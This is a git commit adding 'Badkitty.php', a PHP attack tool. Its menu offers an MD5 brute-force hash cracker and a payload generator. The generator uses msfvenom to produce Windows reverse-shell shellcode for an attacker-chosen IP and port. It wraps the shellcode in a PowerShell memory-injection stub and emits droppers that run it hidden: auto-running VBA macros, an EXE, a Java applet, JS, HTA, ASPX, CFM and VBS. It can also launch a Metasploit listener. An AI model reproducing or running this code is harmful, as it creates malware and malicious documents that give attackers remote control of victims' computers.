e0966e680939790d77f1d8f86ec5d483b85df95c
AyanSul <Cyber2kidds@gmail.com>
2017-04-14 22:23:58 +0300

    Add files via upload

---
+++ Badkitty.php
@@ -0,0 +1,354 @@
+#!/usr/bin/php
+<?php
+system("clear");
+echo "\e[97m  _____                __  __  __      __    __                 \e[0m \n";
+echo "\e[97m /\  _ `\             /\ \/\ \/\ \  __/\ \__/\ \__  \e[31mv1.0\e[0m\e[0m \n";   
+echo "\e[97m \ \ \L\ \     __     \_\ \ \ \/'/'/\_\ \ ,_\ \ ,_\  __  __     \e[0m \n";
+echo "\e[97m  \ \  _ <'  /'__`\   /'_` \ \ , < \/\ \ \ \/\ \ \/ /\ \/\ \    \e[0m \n";
+echo "\e[96m   \ \ \L\ \/\ \L\.\_/\ \L\ \ \ \\`\\ \ \ \ \_\ \ \_\ \ \_\ \   \e[0m \n";
+echo "\e[96m    \ \____/\ \__/.\_\ \___,_\ \_\ \_\ \_\ \__\\ \__\\/`____ \  \e[0m \n";
+echo "\e[96m     \/___/  \/__/\/_/\/__,_ /\/_/\/_/\/_/\/__/ \/__/ `/___/> \ \e[0m \n";
+echo "\e[96m                                                       /\____ / \e[0m \n";
+echo "\e[96m                                                       \/____/  \e[0m \n";
+echo "\e[92m\e[1m +-- -- +=[ Script Name : Badkitty | Author: Ay@nSul | Cyber2kidds@gmail.com\e[0m\n";     
+echo "\e[92m\e[1m +-- -- +=[ Available Format : vba , vbs , exe , java , js , php , hta , cfm , aspx , cmd , raw\e[0m\n";
+echo "\e[92m\e[1m +-- -- +=[ PHP! 3meth \e[0m\n\n";
+echo "[\e[31m1\e[0m] Hash Cracker (slow with 5+ chars)\n";
+echo "[\e[31m2\e[0m] Reverse Engeneering (windows platform)\n";
+echo "[\e[31m3\e[0m] Post BruteForce   \n\n";
+echo "Enter number 1-3 :"; $Meth = trim(fgets(STDIN,8));
+
+if($Meth == '1'){
+	function GTM() {
+list($usec, $sec) = explode(" ",microtime());
+return ((float)$usec + (float)$sec);
+}
+	 
+$time_start = GTM();
+// algorithm of hash
+define('HASH_ALGO', 'md5');
+// max length of password to try
+define('PASSWORD_MAX_LENGTH', 8);
+$chr = 'abcdefghijklmnopqrstuvwxyz';
+$chr .= '0123456789';
+$chr .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+$chr .= '~`!@#$%^&*()-_\/\'";:,.+=<>? ';
+$strl = strlen($chr);
+echo "\n\e[92m\e[1m Enter Hash To Crack: \e[0m"; $hash_password = trim(fgets(STDIN,1024));
+function ck($password)
+{
+        global $hash_password, $time_start;     
+        if (hash(HASH_ALGO, $password) == $hash_password) {
+                echo "\n\n \e[1m\e[33m[*]\e[0m " . "\e[1m\e[31mPassword Cracked\e[0m ===> " . "\e[1m\e[33m".$password . "\e[0m\n\n";
+                $time_end = GTM();
+                $time = $time_end - $time_start; 
+                echo " Found in " . $time . " seconds\n";
+                exit;
+        }
+}
+function rc($width, $position, $base_string)
+{
+        global $chr, $strl;
+        for ($i = 0; $i < $strl; ++$i) {
+                if ($position  < $width - 1) {
+                        rc($width, $position + 1, $base_string . $chr[$i]);
+                }
+                ck($base_string . $chr[$i]);
+        }
+}
+echo "\e[0m \e[95mTarget hash\e[0m : " . $hash_password . "\n";
+for ($i = 1; $i < PASSWORD_MAX_LENGTH + 1; ++$i) {
+        echo "\n " . "Cracking passwords with length ===>" .$i;
+        $time_ck = GTM();
+        $time = $time_ck - $time_start;
+        echo "\n " . "\e[91mRuntime ---> \e[0m" . $time . " s";
+        rc($i, 0, '');
+}
+echo "Execution complete, no password found\r\n";
+}
+elseif($Meth == '2'){
+
+function generate_shell(){
+	echo "\e[92m\e[1mIP : \e[0m"; $lhost = trim(fgets(STDIN,100));
+	echo "\e[92m\e[1mPayload : \e[0m"; $lpayload = trim(fgets(STDIN,2048));
+	echo "\e[92m\e[1mPort : \e[0m"; $lport = trim(fgets(STDIN,34));
+	echo "\n\e[101m\e[97mDo you want from badkitty to start lestining after generatin the payload (Y/N) \e[0m?"; $ltn = trim(fgets(STDIN,34));
+	$exe_arch = "32";
+	if($ltn == "" || $ltn == 'Y' || $ltn == 'y'){
+		$mf = fopen("meta.rc", "w") or die("Unable to open file!");
+		$v = "use exploit/multi/handler\n";
+		$a = "set LHOST ".$lhost."\n";
+		$b = "set PAYLOAD ".$lpayload."\n";
+		$c = "set LPORT ".$lport."\n";
+		$d = "exploit -j";
+		fwrite($mf, $v);
+		fwrite($mf, $b);
+		fwrite($mf, $a);
+		fwrite($mf, $c);
+		fwrite($mf, $d);
+		fclose($mf);
+	}
+	
+	echo "\n\e[91mGenerating Payload\e[0m . . .";
+	system("msfvenom -p {$lpayload} LHOST={$lhost} LPORT={$lport} --arch x86 --platform windows --smallest -f raw > raw_shellcode.txt");
+	$ascar = array();
+	$hxar = array();
+    $data = file_get_contents("raw_shellcode.txt");
+	$asc=unpack("C*",$data);
+	array_push($ascar,$asc);
+    system("rm raw_shellcode.txt");
+	foreach($ascar as $val=>$k){
+		for($i=1; $i<=count($k);$i++){
+			 $res = sprintf("0x%02x", $k[$i]);
+			array_push($hxar,$res);	
+		}
+	}
+	$fin="";
+	global $rs;
+	foreach($hxar as $i) {
+		$fin .= $i.",";
+		 $rs = rtrim(rtrim($fin,','));	
+	}
+	$pss = "$1 = '\$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"."[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,uint dwCreationFlags, IntPtr lpThreadId);"."[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';".'$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;'.'[Byte[]];[Byte[]]$sc = '.$rs.';'.'$size = 0x1000;'.'if ($sc.Length -gt 0x1000){$size = $sc.Length};'.'$x=$w::VirtualAlloc(0,0x1000,$size,0x40);'.'for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};'.'$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\';'.'$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));'.'if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc ";iex "& powershell $cmd $gq";}';
+
+	$fn = iconv($in_charset = 'UTF-8' , $out_charset = 'UTF-16LE' , $pss);
+	$un = base64_encode($fn);
+	$nw = preg_replace("/\n/","",$un);	
+	return $nw;
+}	
+echo "\e[92m\e[1mType encode : \e[0m"; $lencode = trim(fgets(STDIN,2048));
+function prep_PS_chunk($ps_shellcode){
+
+	$stringCommands="";
+	$va ="stringFinal=stringA+stringB+";
+	global $varFinal;
+	$index=array();
+	$splitup = array();
+	$st="";
+	$splitup = preg_match_all('/.{1,254}/', $ps_shellcode, $matches);
+	
+		foreach($matches as $loop => $b){
+			foreach($b as $t => $y){			
+				$stringCommands .= "string{$t}=\"{$y}\"\n";          
+				array_push($index,$t);		
+			}
+		}
+		$st = "stringFinal=stringA+stringB+";
+		foreach($index as $k => $v){
+		 	$varFinal .= "string{$v}+";
+		}
+		$plus = rtrim($varFinal,"+");
+		return $stringCommands."\n".$st.$plus;
+}
+
+//-----------------------------------------------------<<<<<<<<<<<<<<< ENCODE VALUES >>>>>>>>>>>>>>>--------------------------------------------------------------//
+
+##########################VBA-ENCODE###########################
+if($lencode == "vba"){
+
+$pse = generate_shell();
+$prepped_powershell_encoded = prep_PS_chunk($pse);
+
+$vba = 'Sub Auto_Open()
+
+stringA = "power"
+stringB = "shell.exe -NoE -NoP -NonI -W Hidden -E "
+           
+'.$prepped_powershell_encoded.'
+
+    Shell stringFinal, 0
+End Sub
+
+Sub AutoOpen()
+        Auto_Open
+End Sub
+Sub Workbook_Open()
+        Auto_Open
+End Sub'."\n";
+
+echo "\e[96m".$vba."\e[0m\n";
+
+	if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+		system("rm meta.rc");
+	}else{
+		echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+	}
+
+}
+###########################EXE ENCODE#############################
+elseif($lencode == "exe" || $lencode == "EXE"){
+
+$mingw = false;
+if(file_exists('/usr/bin/x86_64-w64-mingw32-gcc')){
+	$mingw= true;
+}elseif ($mingw == false){
+    echo "Must have MinGW installed in order to compile EXEs!!\n";
+    echo "Run to download: apt-get install mingw-w64 \n";
+    die();
+}
+
+$powershell_encoded = generate_shell();
+
+$exe ='include <stdio.h>
+#include <stdlib.h>
+
+int main()
+\{
+    system("powershell -nop -win Hidden -noni -enc '.$powershell_encoded.');
+    return 0;
+\}
+
+}';
+
+$ef = fopen("c_file_temp.c", "w") or die("Unable to open file!");
+fwrite($ef, $exe);
+fclose($mf); 
+echo "compiling...";
+
+if ($exe_arch == "32"){
+    system("i686-w64-mingw32-gcc c_file_temp.c -o kitty_.exe");
+}else{ 
+    system("x86_64-w64-mingw32-gcc c_file_temp.c -o kitty_.exe");
+}
+system("rm c_file_temp.c");
+echo "kitty_.exe created!\n";
+echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+}
+###########################JAVA ENCODE#############################
+elseif($lencode == "java"){
+
+$powershell_encoded = generate_shell();
+
+$java = 'import java.applet.*;
+import java.awt.*;
+import java.io.*;
+public class Java extends Applet \{
+public void init() \{
+Process f;
+
+String cmd = "cmd.exe /c powershell -nop -win Hidden -noni -enc '.$powershell_encoded.';
+try {
+f = Runtime.getRuntime().exec(cmd);
+}
+catch(IOException e) {
+e.printStackTrace();
+}
+Process s;
+}
+}'."\n";
+
+echo $java;
+echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+}
+############################JS ENCODE#############################
+elseif($lencode =="js"){
+
+$powershell_encoded = generate_shell();
+
+$js= 'var objShell = new ActiveXObject("WScript.shell");
+objShell.run("powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0);'."\n";
+
+echo $js;
+echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+}
+###########################PHP ENCODE#############################
+elseif($lencode =="php"){
+
+$powershell_encoded = generate_shell();
+
+$php = '{<?php
+system("cmd.exe /c powershell -nop -win Hidden -noni -enc'.$powershell_encoded.'");
+?>'."\n";
+
+echo $php;
+echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+}
+###########################HTA ENCODE#############################
+elseif($lencode =="hta"){
+
+$powershell_encoded = generate_shell();
+
+$hta = '<html> 
+<head> 
+<script language="VBScript"> 
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0
+</script> 
+</head> 
+<body> 
+<!-- info -->
+</body> 
+</html>'."\n";
+
+
+echo $hta;
+echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+}
+###########################CFM ENCODE#############################
+elseif($lencode == "cfm"){
+
+$powershell_encoded = generate_shell();
+
+$cfm = '<cfexecute name = "C:\\Windows\\System32\\cmd.exe"
+   arguments = "/c powershell -nop -win Hidden -noni -enc .'.$powershell_encoded.'"
+   timeout = "10">
+</cfexecute>'."\n";
+
+echo $cfm;
+echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+}
+###########################ASPX ENCODE#############################
+elseif($lencode =="aspx"){
+
+$powershell_encoded = generate_shell();
+
+$aspx = '
+<%@ Page Language="C#" AutoEventWireup="true" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+	private void Page_Load(object sender, System.EventArgs e){
+		System.Diagnostics.Process process = new System.Diagnostics.Process();
+		process.StartInfo.FileName = "powershell.exe";
+		process.StartInfo.Arguments = " -nop -win Hidden -noni -enc '.$powershell_encoded.'";
+		process.Start();
+	}
+</script>'."\n";
+
+echo $aspx;
+echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
+
+}
+###########################CMD ENCODE#############################
+elseif($lencode =="cmd"){
+
+ $powershell_encoded = generate_shell();
+    echo "powershell -nop -win Hidden -noni -enc " + $powershell_encoded;
+	echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
+}
+###########################RAW ENCODE#############################
+elseif($lencode == "raw"){
+
+$powershell_encoded = generate_shell();
+    echo $powershell_encoded;
+	echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
+}
+######################VBS_ENCODE###############################
+elseif($lencode =="vbs"){
+
+$powershell_encoded = generate_shell();
+
+$vbs= 'Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0';
+
+echo $vbs;
+
+}else{
+	die("Unknown Format!\n");
+}
+}
